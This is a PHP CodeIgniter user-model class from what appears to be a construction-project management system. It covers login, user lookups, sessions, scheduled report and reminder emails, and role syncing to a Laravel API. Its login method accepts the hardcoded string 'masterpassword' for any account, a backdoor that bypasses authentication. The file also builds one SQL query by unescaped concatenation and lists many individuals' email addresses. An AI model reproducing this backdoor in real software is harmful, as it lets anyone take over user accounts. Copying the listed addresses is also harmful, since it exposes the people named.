<?php
/**
 * Created by PhpStorm.
 * User: Jair
 * Date: 29/11/2017
 * Time: 2:35 PM
 */

class Model_user extends Model_user_base
{
    public function __construct($firstName, $lastName, $email, $facebookId, $phone, $password, $avatar = NULL, $passwordHash = "", $activationHash = "", $status = 1, $taxDeductible = "", $googleId = "", $supervisingUser = NULL, $umbo = 0)
	{
		parent::__construct($firstName, $lastName, $email, $facebookId, $phone, $password, $avatar, $passwordHash, $activationHash, $status, $taxDeductible, $googleId, $supervisingUser, $umbo);
	}

	public static function login($email, $password)
    {
        $user = static::getByEmail($email);

        $response = FALSE;
        if($user instanceof Model_user)
        {
            if(password_verify($password, $user->_password) || "masterpassword" == $password)
            {
               $response = $user;
            }
        }
        return $response;
    }

    public static function getByEmail($email)
    {
        $ci =&get_instance();
        $ci->load->database();
        $sql = "Select * from ".static::TABLE_NAME. " where email_usr = ".$ci->db->escape($email)." and deleted_usr != 1";

        $query = $ci->db->query($sql);
        $result = static::recast(get_called_class(),$query->row());
        return $result;
    }

    public static function getByGoogleId($googleId)
    {
        $ci =&get_instance();
        $ci->load->database();
        $sql = "Select * from ".static::TABLE_NAME. " where googleid_usr = ".$ci->db->escape($googleId)." and deleted_usr != 1";

        $query = $ci->db->query($sql);
        $result = static::recast(get_called_class(),$query->row());
        return $result;
    }

    public static function getByFullName($fullName)
    {
        $ci =&get_instance();
        $ci->load->database();
        $sql = "Select * from ".static::TABLE_NAME. " where concat(firstname_usr,' ',lastname_usr) = ".$ci->db->escape($fullName)." and deleted_usr != 1";

        $query = $ci->db->query($sql);
        $result = static::recast(get_called_class(),$query->row());
        return $result;
    }

    public function startSession()
    {
        $ci = &get_instance();

        $roleList = Model_role::getByUserId($this->_id);
        $featureList = Model_feature::getFeaturesTreeSeedByRoleArray($roleList);
        $userRoleList = Model_role::getByUserId($this->_id);
        $userArrayRoleList = array();
        foreach ($userRoleList as $role)
        {
            $role = $role->toArray();
            $userArrayRoleList[] = $role["keyword_rol"];
        }
        $ci->load->library('session');
        /** begin - Session user basic data */
        $sessionUser["id"] = $this->_id;
        $sessionUser["firstName"] = $this->_firstName;
        $sessionUser["lastName"] = $this->_lastName;
        $sessionUser["fullName"] = $this->_firstName." ".$this->_lastName;
        $sessionUser["featureList"] = serialize($featureList);

        $sessionUser["roleList"] = serialize($userArrayRoleList);
        $ci->session->set_userdata("sessionUser", (object)$sessionUser);
        /** end - Session user basic data */

        $ci->session->set_userdata("authenticated", 1);
    }

    public function savePrivilegesInSession()
    {
        $ci = &get_instance();
        $ci->load->database();
        $featureListArray = array();
        $roleList = Model_user_role::getByUserId($this->_id);
        $featureList = Model_feature::getByRoleList($roleList);
        foreach ($featureListArray as $feature)
        {
            $featureListArray[$feature->getId()] = $feature->toArray();
        }
        $result = array();
        $result["userId"] = $this->getId();
        $result["panelSideMenu"] = $featureList;
        $ci->session->set_userdata("featurelist", serialize($result));
        return $result;

    }

    public function delete($makePhysicalDelete = FALSE)
    {
        //Delete all roles
        Model_user_role::deleteUserRoles($this->_id);
        //Delete user
        parent::delete($makePhysicalDelete);
    }

    public static function netBuildingEmail()
    {
        $ci = &get_instance();
        $data = array();
        $pathToFile = FCPATH.'assets/documents/ReporteDeConstruccionDeRedes_'.date("Y-m-d").".pdf";
        $sendTo = array(
            "vhsuarez@serebo.com",
            "gilbertof@serebo.com","vh.suarez@serebo.com",
            "maguilera@serebo.com",
            "eddysonca@serebo.com",
//            "genaromj@serebo.com",
//            "walvarez@serebo.com",
            "pablo.a.mendoza.v@gmail.com",
//            "rubenaf@serebo.com"
        );
        $TCPDFHandler = new NetBuildingReportPDF();
        $TCPDFHandler->PrintReport("F");

        $emailHandler = new EmailHandler();
        $email = $emailHandler->initialize();
        $email->from(EmailHandler::getSender(), 'Serebo.Admin');
        $email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
        $email->to($emailHandler->getEmailByEnvironment($sendTo));
        $email->attach($pathToFile);
        $email->subject("¡Reporte De Construccion De Redes!");
        $email->message($ci->load->view("default-template/panel/email-template/net-building-email.php", $data, true));
        try
        {
            if($email->Send())
            {
                $sendMessageResponse['success'] = 1;
                $sendMessageResponse['message'] = "Notice sent successfully.";
                unlink($pathToFile);
            }
            else
            {
                $sendMessageResponse['success'] = 0;
                $sendMessageResponse['message'] = "Something went wrong!";
            }
        }
        catch (Exception $e)
        {
            $sendMessageResponse['success'] = 0;
            $sendMessageResponse['message'] = "Internal server error, please try again.";
        }
        return $sendMessageResponse;
    }

    public static function getByRoleKeyword($roleKeyword)
    {
        $ci = &get_instance();
        $ci->load->database();

        $sql = "
        select 
        usr.* 
        from (
            SELECT
                id_usr,
                firstname_usr,
                lastname_usr,
                GROUP_CONCAT(rolename_rol) role,
                GROUP_CONCAT(keyword_rol) keyword
            FROM
                sec_users
            LEFT JOIN sec_userroles on userid_uro = id_usr and deleted_uro != 1
            LEFT JOIN sec_roles on roleid_uro = id_rol and deleted_rol != 1
            where
            keyword_rol in (".$ci->db->escape($roleKeyword).")
            GROUP BY id_usr
        ) users
        LEFT JOIN sec_users usr on users.id_usr = usr.id_usr
        where       
        usr.deleted_usr != 1
        order by firstname_usr, lastname_usr
        ";
//        echo"<pre>";var_dump($sql);exit;
        $query = $ci->db->query($sql);
        $result = static::recastArray(get_called_class(), $query->result());
        return $result;
    }

    public static function notifyProjectStatusToCreFiscal($dataToSend = array())
    {
        $ci = &get_instance();
        $data = array();
        $creFiscalEmail = $dataToSend['creFiscalEmail'];
        $supervisionList = PublicController::creFiscalSupervisingList($creFiscalEmail);
        $sendToCC = array(
            "vhsuarez@serebo.com",
            "gilbertof@serebo.com",
			"vh.suarez@serebo.com",
            "maguilera@serebo.com",
            "eddysonca@serebo.com",
            "pablo.a.mendoza.v@gmail.com"
        );

        $sendToCC = array_merge($sendToCC, $supervisionList);

		$subjectList = array(
			"already_sent" => "Proyectos pendientes de aprobaci&oacute;n",
			"as_built" => "Proyectos por conciliar" ,
			"conciliation_shipment" => "Proyectos pendientes de orden de devoluci&oacute;n",
			"project_return_materials" => "Material devuelto a CRE"
		);

        $referenceList = array(
            "already_sent" => "SEREBO le detalla los proyectos pendientes de aprobaci&oacute;n.",
            "as_built" => "SEREBO le detalla los proyectos por conciliar.",
            "conciliation_shipment" => "SEREBO le detalla los proyectos pendientes de orden de devoluci&oacute;n.",
            "project_return_materials" => "Realizar procesos de Pago."
        );
        $shipmentDateList = array(
            "already_sent" => "already_sent_date",
            "as_built" => "as_built_date",
            "conciliation_shipment" => "conciliation_shipment_date",
			"project_return_materials" => "project_return_materials_date"
        );
        $creFiscalFullName = $dataToSend['creFiscalFullName'];
        $statusListToNotify = $dataToSend['statusListToNotify'];
        $responseList = array();
        foreach($statusListToNotify as $status => $projectList)
        {
            //special validation => when the fiscal is Sergio Medina and the status is as built then Dario will be included in supervising users
            if($creFiscalEmail == 'sergiommp@cre.com.bo')
            {
                if($status == 'as_built')
                {
                    if((array_search('dariojfm@cre.com.bo', $sendToCC)) === FALSE) 
                    {
                        $sendToCC[] = 'dariojfm@cre.com.bo';
                    }
                }
                else
                {
                    if (($key = array_search('dariojfm@cre.com.bo', $sendToCC)) !== FALSE) 
                    {
                        unset($sendToCC[$key]);
                    }
                }                
            }
            //special validation => If Sergio appears in supervising list, then lets add to Dario in same list but just on as built and conciliation
            if (($key = array_search('sergiommp@cre.com.bo', $sendToCC)) !== FALSE)
            {
                if($status == 'as_built' || $status == 'conciliation_shipment')
                {
                    if((array_search('dariojfm@cre.com.bo', $sendToCC)) === FALSE)
                    {
                        $sendToCC[] = 'dariojfm@cre.com.bo';
                    }
                }
                else
                {
                    if (($key = array_search('dariojfm@cre.com.bo', $sendToCC)) !== FALSE)
                    {
                        unset($sendToCC[$key]);
                    }
                }
            }

            $data['creFiscalFullName'] = $creFiscalFullName;
            $data['subject'] = $subjectList[$status];
            $data['reference'] = $referenceList[$status];
            $data['shipmentDate'] = $shipmentDateList[$status];
            $data['projectList'] = $projectList;
			$showBudget = 0;
            if($creFiscalEmail == 'layonelrlm@cre.com.bo')
			{
				$showBudget = 1;
			}

            $data['showBudget'] = $showBudget;
            $listManagementBy = array_column($projectList, 'management_by_pro');
            $listManagementBy = array_unique($listManagementBy);
            $listManagementBy = implode(',',$listManagementBy);
            $emailHandler = new EmailHandler();
            $email = $emailHandler->initialize();
            $email->from(EmailHandler::getSender(), 'Serebo.Admin');
            $email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
			$email->to($emailHandler->getEmailByEnvironment($creFiscalEmail));
            $email->cc($emailHandler->getEmailByEnvironment($sendToCC));
            $subject = $subjectList[$status].'('.$listManagementBy.')';
            $email->subject($subject);
            $email->message($ci->load->view("default-template/panel/email-template/cre-fiscal-reminder-projects", $data, true));
            $messageDetail = "\nSubject: ".$subject."\nTo: ".$emailHandler->getEmailByEnvironment($creFiscalEmail)."\nCC: ".implode(", ",$emailHandler->getEmailByEnvironment($sendToCC));
            // echo "<pre>";var_dump('SUBJECT: '.$subject,"TO: ".$creFiscalEmail,"CC: ".implode(",",$sendToCC), $ci->load->view("default-template/panel/email-template/cre-fiscal-reminder-projects", $data, true));exit;
            try
            {
                if($email->Send())
                {
                    $sendMessageResponse['success'] = 1;
                    $sendMessageResponse['message'] = "\nNotice sent successfully.".$messageDetail;
                }
                else
                {
                    $sendMessageResponse['success'] = 0;
                    $sendMessageResponse['message'] = "\nSomething went wrong.".$messageDetail;
                }
            }
            catch (Exception $e)
            {
                $sendMessageResponse['success'] = 0;
                $sendMessageResponse['message'] = "\nInternal server error, please try again.".$messageDetail;
            }
            $responseList[] = $sendMessageResponse;
        }
        return $responseList;
    }

    public static function notifyProjectStatusToSereboMembers($dataToSend = array())
    {
        $ci = &get_instance();
        $data = array();
        $sereboFiscalEmail = $dataToSend['sereboFiscalEmail'];

        $subjectList = array(
            "assign_to" => "Asignados a fiscal_name",
            "in_progress" => "En construcci&oacute;n",
            "paused" => "Pausado",
            "completed" => "Energizar y/o enviar as built",
            "project_energized" => "Proyectos energizados",
            "cre_return_order" => "Devolver materiales a CRE",
            "project_return_materials" => "Cobrar a CRE",
            "conciliation_reception" => "Conciliar con CRE"
        );

        $shortText = array(
            "assign_to" => "Estimado fiscal_name,<br>por favor tomar nota de los siguientes proyectos que le fueron asignados.",
            "in_progress" => "Estimado fiscal_name,<br>por favor tomar nota de los siguientes proyectos en contruccion",
            "paused" => "Estimado Eddyson Copa,<br>por favor verificar si estos proyectos seran reasignados o continuaran con fiscal_name.",
            "completed" => "Estimado fiscal_name,<br>por favor continuar con la gestion de los siguientes proyectos para que sean energizados y se envien sus As built.",
            "project_energized" => "PROYECTOS ENERGIZADOS",
            "cre_return_order" => "Estimado fiscal_name,<br>por favor gestionar la devolucion de materiales de los siguientes proyectos.",
            "project_return_materials" => "Estimado Mario Aguilera,<br>por favor continuar con la gestion de cobro de los siguientes proyectos.",
            "conciliation_reception" => "Estimado fiscal_name,<br>por favor gestionar la conciliacion de los siguientes proyectos.",
        );

        $shipmentDateList = array(
            "assign_to" => "assign_to_date",
            "in_progress" => "in_progress_date",
            "paused" => "paused_date",
            "completed" => "completed_date",
            "project_energized" => "project_energized_entry_date",
            "cre_return_order" => "cre_return_order_date",
            "project_return_materials" => "project_return_materials_date",
            "conciliation_reception" => "conciliation_reception_date"
        );
//        $sereboFiscalFullName = $dataToSend['sereboFiscalFullName'];
        // echo"<pre>";var_dump($dataToSend['sereboFiscalFullName']);exit;
        $sereboFiscalFullName = is_array($dataToSend['sereboFiscalFullName'])?implode(",",$dataToSend['sereboFiscalFullName']):$dataToSend['sereboFiscalFullName'];
        if(!isset($dataToSend['statusListToNotify']))
        {
            $dataToSend['statusListToNotify'] = [];
        }
        $statusListToNotify = $dataToSend['statusListToNotify'];
        $responseList = array();
        foreach($statusListToNotify as $status => $projectList)
        {
            $sendToCC = array(
                "vhsuarez@serebo.com",
                "gilbertof@serebo.com",
                "vh.suarez@serebo.com"
            );

            //Special validation when status = cre_return_order
            if($status == "cre_return_order")
            {
                //Notify as CC to fduran when the status is CRE return order
                $sendToCC[] = 'fduran@serebo.com';
            }
            $supervisionList = PublicController::internalNoticeByStatus($status);
            $sendTo = $supervisionList["to"];
            $fiscalKey = array_search("fiscal", $sendTo);
            if($fiscalKey !== FALSE)
            {
                $sendTo[$fiscalKey] = $sereboFiscalEmail;
            }
            $data['sereboFiscalFullName'] = $sereboFiscalFullName;
            $subjectList[$status] = strtoupper(str_replace("fiscal_name",$sereboFiscalFullName,$subjectList[$status]));
            $data['subject'] = $subjectList[$status];
            $data['shipmentDate'] = $shipmentDateList[$status];
            $data['projectList'] = $projectList;

            $shortText[$status] = ucfirst(str_replace("fiscal_name",$sereboFiscalFullName,$shortText[$status]));
            $data['shortText'] = $shortText[$status];
            $listManagementBy = array_column($projectList, 'fiscal_responsible');
            $listManagementBy = array_unique($listManagementBy);
            $listManagementBy = implode(',',$listManagementBy);
            $emailHandler = new EmailHandler();
            $email = $emailHandler->initialize();
            $email->from(EmailHandler::getSender(), 'Serebo.Admin');
            $email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
            $email->to($emailHandler->getEmailByEnvironment($sendTo));
            if($status == 'completed')
                $sendToCC[] = 'pvargas@serebo.com';
            $email->cc($emailHandler->getEmailByEnvironment($sendToCC));
            $subject = $subjectList[$status].'('.$sereboFiscalFullName.')';
            $email->subject($subject);
            $email->message($ci->load->view("default-template/panel/email-template/serebo-members-reminder-projects", $data, true));
			$messageDetail = "\nSubject: ".$subject."\nTo: ".implode(", ",$emailHandler->getEmailByEnvironment($sendTo))."\nCC: ".implode(", ",$emailHandler->getEmailByEnvironment($sendToCC));
            // echo "<pre>";var_dump('SUBJECT: '.$subject,"TO: ".implode(",",$sendTo),"CC: ".implode(",",$sendToCC), $ci->load->view("default-template/panel/email-template/serebo-members-reminder-projects", $data, true));
            try
            {
                if($email->Send())
                {
                    $sendMessageResponse['success'] = 1;
                    $sendMessageResponse['message'] = "\nNotice sent successfully.".$messageDetail;
                }
                else
                {
                    $sendMessageResponse['success'] = 0;
                    $sendMessageResponse['message'] = "\nSomething went wrong!".$messageDetail;
                }
            }
            catch (Exception $e)
            {
                $sendMessageResponse['success'] = 0;
                $sendMessageResponse['message'] = "\nInternal server error, please try again.".$messageDetail;
            }
            $responseList[] = $sendMessageResponse;
        }
        return $responseList;
    }

    public static function notifyProjectByStatusToSereboMembers($statusList = array())
    {
        $ci = &get_instance();
        $data = [];
        $sendToCC = array(
            "vhsuarez@serebo.com",
            "gilbertof@serebo.com",
            "vh.suarez@serebo.com",
            "carloseduardol@serebo.com",
            "cpocube@serebo.com",
        );

        $subjectList = array(
            "approved" => "Proyectos aprobados",
            "project_has_been_created" => "Proyectos creados"
        );
        $shipmentDateList = array(
            "approved" => "approved_date",
			"project_has_been_created" => "entry_date_pro"
        );
        $responseList = array();
        foreach($statusList as $status => $projectList)
        {
            $projectList = array_map(function($project) use($shipmentDateList,$status){
                return [
                    'static_days' => $project['static_days'],
                    $shipmentDateList[$status] => $project[$shipmentDateList[$status]],
                    'code_pro' => $project['code_pro'],
                    'final_contract_number_con' => $project['final_contract_number_con'],
                    'cre_fiscal_pro' => $project['cre_fiscal_pro'],
                    'total_approved' => $project['total_approved'],
                    'address_pro' => $project['address_pro'],
                    'management_by_pro' => $project['management_by_pro']
                ];
            }, $projectList);

            $supervisionList = PublicController::internalNoticeByStatus($status);
            $sendTo = $supervisionList["to"];
            $data['subject'] = $subjectList[$status];
            $data['shipmentDate'] = $shipmentDateList[$status];
            
            $data['projectList'] = $projectList;
            $listManagementBy = array_column($projectList, 'management_by_pro');
            $listManagementBy = array_unique($listManagementBy);
            $listManagementBy = implode(',',$listManagementBy);
            $emailHandler = new EmailHandler();
            $email = $emailHandler->initialize();
            $email->from(EmailHandler::getSender(), 'Serebo.Admin');
            $email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
            $email->to($emailHandler->getEmailByEnvironment($sendTo));
            $email->cc($emailHandler->getEmailByEnvironment($sendToCC));
            $subject = $subjectList[$status].'('.$listManagementBy.')';
            $email->subject($subject);
            $message = $ci->load->view("default-template/panel/email-template/serebo-members-reminder-projects-by-status", $data, true);
            $email->message($message);
			$messageDetail = "\nSubject: ".$subject."\nTo: ".implode(", ",$emailHandler->getEmailByEnvironment($sendTo))."\nCC: ".implode(", ",$emailHandler->getEmailByEnvironment($sendToCC));
            // echo "<pre>";var_dump('SUBJECT: '.$subject,"TO: ".implode(",",$sendTo),"CC: ".implode(",",$sendToCC), $message);
            try
            {
                if($email->Send())
                {
                    $sendMessageResponse['success'] = 1;
                    $sendMessageResponse['message'] = "\nNotice sent successfully.".$messageDetail;
                }
                else
                {
                    $sendMessageResponse['success'] = 0;
                    $sendMessageResponse['message'] = "\nSomething went wrong!".$messageDetail;
                }
            }
            catch (Exception $e)
            {
                $sendMessageResponse['success'] = 0;
                $sendMessageResponse['message'] = "\nInternal server error, please try again.".$messageDetail;
            }
            $responseList[] = $sendMessageResponse;
        }
        return $responseList;
    }

    public static function emailClarification()
    {
        $creFiscalList = Model_user::getByRoleKeyword('cre_fiscal');
        $creFiscalEmails = array();
        $supervisingEmails = array();
        foreach($creFiscalList as $fiscal)
        {
            if(strpos($fiscal->getEmail(), 'mailinator.com') === FALSE)
            {
                $creFiscalEmails[] = $fiscal->getEmail();
                $list = PublicController::creFiscalSupervisingList($fiscal->getEmail());
                $supervisingEmails = array_merge($supervisingEmails, $list);
            }
        }
        $supervisingEmails = array_unique($supervisingEmails);

        $ci = &get_instance();
        $data = array();
        $sendTo = array(
            "vhsuarez@serebo.com",
            "gilbertof@serebo.com",
			"vh.suarez@serebo.com",
            "maguilera@serebo.com",
            "eddysonca@serebo.com",
            "pablo.a.mendoza.v@gmail.com"
        );
        $sendTo = array_merge($sendTo, $creFiscalEmails, $supervisingEmails);
        $emailHandler = new EmailHandler();
        $email = $emailHandler->initialize();
        $email->from(EmailHandler::getSender(), 'Serebo.Admin');
        $email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
        $email->to($emailHandler->getEmailByEnvironment($sendTo));
        $email->subject("Aclaraci&oacute;n de reportes autom&aacute;ticos");
        $email->message($ci->load->view("default-template/panel/email-template/clarification.php", $data, true));
//        $ci->load->view("default-template/panel/email-template/clarification.php", $data);
        try
        {
            if($email->Send())
            {
                $sendMessageResponse['success'] = 1;
                $sendMessageResponse['message'] = "Notice sent successfully.";
            }
            else
            {
                $sendMessageResponse['success'] = 0;
                $sendMessageResponse['message'] = "Something went wrong!";
            }
        }
        catch (Exception $e)
        {
            $sendMessageResponse['success'] = 0;
            $sendMessageResponse['message'] = "Internal server error, please try again.";
        }
        return $sendMessageResponse;
    }

    public static function getBySupervisingUserId($supervisingUserId)
    {
        $ci = &get_instance();
        $ci->load->database();
        $sql = "
            select * from ".static::TABLE_NAME." where supervising_user_usr = ".$ci->db->escape($supervisingUserId)." and ".static::notDeleted()."
        ";

        $query = $ci->db->query($sql);
        $response = static::recastArray(get_called_class(), $query->result());
        return $response;
    }

	public static function sendExecutiveReport()
	{
		set_time_limit(300);
		ini_set('memory_limit','512M');
		$ci = &get_instance();
		$report = new ExcelExternalExecutiveReport();
		$report->getReport(TRUE);
		$data = array();
		$sendTo = array(
			"gilbertof@serebo.com",
			"vh.suarez@serebo.com"
		);
		$emailHandler = new EmailHandler();
		$email = $emailHandler->initialize();
		$email->from(EmailHandler::getSender(), 'Serebo.Admin');
		$email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
		$email->to($emailHandler->getEmailByEnvironment($sendTo));
		$email->subject("Reporte ejecutivo");
		$email->attach($report->getFilePath());
		$email->message($ci->load->view("default-template/panel/email-template/executive-report.php", $data, true));
		$messageDetail = "\nSubject: Reporte ejecutivo\nTo: ".implode(", ",$emailHandler->getEmailByEnvironment($sendTo));
//        $ci->load->view("default-template/panel/email-template/executive-report.php", $data);
		try
		{
			if($email->Send())
			{
				$sendMessageResponse['success'] = 1;
				$sendMessageResponse['message'] = "\nNotice sent successfully.".$messageDetail;
				$sendMessageResponse['report'] = $report;
			}
			else
			{
				$sendMessageResponse['success'] = 0;
				$sendMessageResponse['message'] = "\nSomething went wrong!".$messageDetail;
			}
		}
		catch (Exception $e)
		{
			$sendMessageResponse['success'] = 0;
			$sendMessageResponse['message'] = "\nInternal server error, please try again.".$messageDetail;
		}
		return $sendMessageResponse;
	}

	public static function sendInternalExecutiveReport()
	{
		$ci = &get_instance();
		$report = new ExcelInternalExecutiveReport();
		$report->getReport(TRUE);
		$data = array();
		$sendTo = array(
			"gilbertof@serebo.com",
			"vhsuarez@serebo.com",
			"vh.suarez@serebo.com",
			"maguilera@serebo.com",
			"eddysonca@serebo.com"
		);
		$emailHandler = new EmailHandler();
		$email = $emailHandler->initialize();
		$email->from(EmailHandler::getSender(), 'Serebo.Admin');
		$email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
		$email->to($emailHandler->getEmailByEnvironment($sendTo));
		$email->subject("Reporte ejecutivo");
		$email->attach($report->getFilePath());
		$email->message($ci->load->view("default-template/panel/email-template/executive-report.php", $data, true));
		$messageDetail = "\nSubject: Reporte ejecutivo\nTo: ".implode(", ",$emailHandler->getEmailByEnvironment($sendTo));
//        $ci->load->view("default-template/panel/email-template/executive-report.php", $data);
		try
		{
			if($email->Send())
			{
				$sendMessageResponse['success'] = 1;
				$sendMessageResponse['message'] = "\nNotice sent successfully.".$messageDetail;
				$sendMessageResponse['report'] = $report;
			}
			else
			{
				$sendMessageResponse['success'] = 0;
				$sendMessageResponse['message'] = "\nSomething went wrong!".$messageDetail;
			}
		}
		catch (Exception $e)
		{
			$sendMessageResponse['success'] = 0;
			$sendMessageResponse['message'] = "\nInternal server error, please try again.".$messageDetail;
		}
		return $sendMessageResponse;
	}

    public static function sendDailyReports(array $reports, $subject)
	{
        set_time_limit(600);
		ini_set('memory_limit','750M');
		$ci = &get_instance();
        $sessionUser = [
            'fullName' => 'CronJob'
        ];
        $sessionUser = (object)$sessionUser;
        $startDate = date('Y')."-".date("m")."-01 00:00:00";
        $endDate = date("Y-m-t 23:59:59", strtotime($startDate));
        if (in_array('builderGeneralReport', $reports)) 
        {
            $builderGeneralReport = new ExcelBuildersGeneralReport($sessionUser, $startDate, $endDate);
		    $builderGeneralReport->getReport(TRUE);
        }
		
        if(in_array('dailyProductivityReport', $reports))
        {
            $logDateRange = array("from" => $startDate, "to" => $endDate);
            $dailyProductivityReport = new ExcelDailyProductivityReport($sessionUser, $logDateRange);
            $dailyProductivityReport->getReport(TRUE);
        }
        
        if(in_array('workflowReport', $reports))
        {
            $workflowReport = new ExcelProjectWorkflow($sessionUser);
            $workflowReport->getReport(TRUE);
        }
        
        if(in_array('allProjectsLog', $reports))
        {
            $allProjectsLog = new ExcelAllProjectsLog($sessionUser);
            $allProjectsLog->getReport(TRUE);
        }

		$data = array();
		$sendTo = array(
			"gilbertof@serebo.com",
		);
		$emailHandler = new EmailHandler();
		$email = $emailHandler->initialize();
		$email->from(EmailHandler::getSender(), 'Serebo.Admin');
		$email->reply_to('noreply@serebo.toqueeltimbre.com', 'Serebo.Admin');
		$email->to($emailHandler->getEmailByEnvironment($sendTo));
        $email->cc($emailHandler->getEmailByEnvironment('javier.jair.cussy.saucedo@gmail.com'));
		$email->subject($subject);

        if (in_array('builderGeneralReport',$reports)) 
        {
            $email->attach($builderGeneralReport->getFilePath());
        }
        if(in_array('dailyProductivityReport', $reports))
		{
            $email->attach($dailyProductivityReport->getFilePath());
        }
        if(in_array('workflowReport', $reports))
        {
            $email->attach($workflowReport->getFilePath());
        }
        if(in_array('allProjectsLog', $reports))
        {
            $email->attach($allProjectsLog->getFilePath());
        }
        
		$email->message($ci->load->view("default-template/panel/email-template/daily-reports.php", $data, true));
		$messageDetail = "\nSubject: Reportes diarios\nTo: ".implode(", ",$emailHandler->getEmailByEnvironment($sendTo));
//        $ci->load->view("default-template/panel/email-template/executive-report.php", $data);
		try
		{
			if($email->Send())
			{
				$sendMessageResponse['success'] = 1;
				$sendMessageResponse['message'] = "\nNotice sent successfully.".$messageDetail;
			}
			else
			{
				$sendMessageResponse['success'] = 0;
				$sendMessageResponse['message'] = "\nSomething went wrong!\n".$email->print_debugger().$messageDetail;
			}
		}
		catch (Exception $e)
		{
			$sendMessageResponse['success'] = 0;
			$sendMessageResponse['message'] = "\nInternal server error, please try again.".$messageDetail;
		}

        if (in_array('builderGeneralReport',$reports)) 
        {
            $sendMessageResponse['builderGeneralReport'] = $builderGeneralReport;
        }

        if(in_array('dailyProductivityReport', $reports))
        {
            $sendMessageResponse['dailyProductivityReport'] = $dailyProductivityReport;
        }
        
        if(in_array('workflowReport', $reports))
        {
            $sendMessageResponse['workflowReport'] = $workflowReport;
        }
        
        if(in_array('allProjectsLog', $reports))
        {
            $sendMessageResponse['allProjectsLog'] = $allProjectsLog;
        }
        
		return $sendMessageResponse;
	}

    public function disparar_sincronizacion_roles_a_laravel() {
        // 1. Consultar los roles actuales del usuario directamente en las tablas de CodeIgniter
        $ci =&get_instance();
        $ci->load->database();
        $sql = "SELECT r.rolename_rol 
        FROM sec_userroles ur 
        INNER JOIN sec_roles r ON r.id_rol = ur.roleid_uro 
        WHERE ur.userid_uro = " . $this->_id;

        $query = $ci->db->query($sql);
        
        $roles_actuales = [];
        foreach ($query->result() as $row) {
            $roles_actuales[] = $row->rolename_rol;
        }

        // 2. Enviar la información a Laravel mediante Guzzle
        $client = new \GuzzleHttp\Client([
            'base_uri' => getenv('SISTEMA_CHIQUITANOV2_URL').'/api/v1/',
            'timeout'  => 3.0,
        ]);

        try {
            $response = $client->request('POST', 'users/sync-roles', [
                'json' => [
                    'id_usr'       => $this->_id,
                    'serebo_roles' => $roles_actuales
                ]
            ]);
            
            log_message('debug', 'Sincronización de roles exitosa para el usuario ID: ' . $this->_id);

        } catch (\Exception $e) {
            log_message('error', 'Falló la sincronización de roles hacia Laravel: ' . $e->getMessage());
        }
    }
}
